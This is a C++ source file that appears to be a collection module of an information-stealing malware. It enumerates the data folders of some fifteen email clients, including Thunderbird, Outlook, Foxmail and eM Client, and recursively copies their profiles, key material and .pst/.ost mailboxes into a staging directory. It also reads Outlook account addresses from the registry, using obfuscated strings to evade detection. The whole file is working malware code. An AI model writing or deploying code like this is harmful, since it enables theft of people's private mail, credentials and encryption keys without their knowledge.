// Mail clients: Thunderbird family (profiles + key material), Outlook, Foxmail.
#include "../modules.h"
#include "../config.h"
#include "../core/obf.h"
#include "../core/sys.h"
#include <windows.h>
#include <sstream>

namespace {

struct MailTarget { const char* name; const char* path; const char* pattern; };

const MailTarget k_mail[] = {
    {"Thunderbird", "%APPDATA%\\Thunderbird\\Profiles", "*"},
    {"Postbox", "%APPDATA%\\PostboxApp\\Profiles", "*"},
    {"eM Client", "%APPDATA%\\eM Client", "*"},
    {"Foxmail", "%APPDATA%\\Foxmail", "*"},
    {"Foxmail (docs)", "%USERPROFILE%\\Documents\\Foxmail", "*"},
    {"Mailbird", "%APPDATA%\\Mailbird", "*"},
    {"The Bat!", "%APPDATA%\\The Bat!", "*"},
    {"Claws Mail", "%APPDATA%\\Claws Mail", "*"},
    {"Outlook files", "%LOCALAPPDATA%\\Microsoft\\Outlook", "*.ost"},
    {"Outlook pst", "%USERPROFILE%\\Documents\\Outlook Files", "*.pst"},
    {"Outlook config", "%APPDATA%\\Microsoft\\Outlook", "*"},
    {"Windows Mail", "%LOCALAPPDATA%\\Packages\\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\\LocalState", "*"},
    {"IncrediMail", "%APPDATA%\\IM", "*"},
    {"Opera Mail", "%APPDATA%\\Opera Mail", "*"},
    {"DreamMail", "%APPDATA%\\DreamMail", "*"},
};

std::string outlook_accounts_registry() {
    std::ostringstream ss;
    HKEY k = nullptr;
    if (RegOpenKeyExW(HKEY_CURRENT_USER,
            util::widen(OBF("SOFTWARE\\Microsoft\\Office\\16.0\\Outlook\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676")).c_str(),
            0, KEY_READ, &k) == ERROR_SUCCESS) {
        wchar_t sub[256];
        for (DWORD i = 0; RegEnumKeyW(k, i, sub, 256) == ERROR_SUCCESS; ++i) {
            HKEY sk = nullptr;
            if (RegOpenKeyExW(k, sub, 0, KEY_READ, &sk) == ERROR_SUCCESS) {
                wchar_t email[512] = {}, server[512] = {};
                DWORD sz = sizeof(email), type = 0;
                if (RegQueryValueExW(sk, L"Email", nullptr, &type, (LPBYTE)email, &sz) == ERROR_SUCCESS) {
                    ss << "account: " << util::narrow(email);
                    sz = sizeof(server);
                    if (RegQueryValueExW(sk, L"Account Name", nullptr, &type, (LPBYTE)server, &sz) == ERROR_SUCCESS)
                        ss << " (" << util::narrow(server) << ")";
                    ss << "\r\n";
                }
                RegCloseKey(sk);
            }
        }
        RegCloseKey(k);
    }
    return ss.str();
}

} // namespace

namespace mod {

void mail(const std::string& staging) {
    std::ostringstream summary;
    int hits = 0;
    for (auto& m : k_mail) {
        std::string path = util::expand_env(m.path);
        if (path.empty() || !util::path_exists(path)) continue;
        hits++;
        util::copy_dir_recursive(path, util::join(staging, "mail\\" + std::string(m.name)),
                                 {m.pattern}, 32 * 1024 * 1024);
        summary << "  " << m.name << ": " << path << "\r\n";
    }
    std::string accounts = outlook_accounts_registry();
    if (!accounts.empty()) {
        stage::stage_text("mail", "outlook_accounts.txt", accounts);
        summary << "  Outlook registry accounts: yes\r\n";
        hits++;
    }
    stage::stage_text("mail", "_summary.txt", summary.str());
    stage::note("mail", std::to_string(hits) + " mail targets collected");
}

} // namespace mod
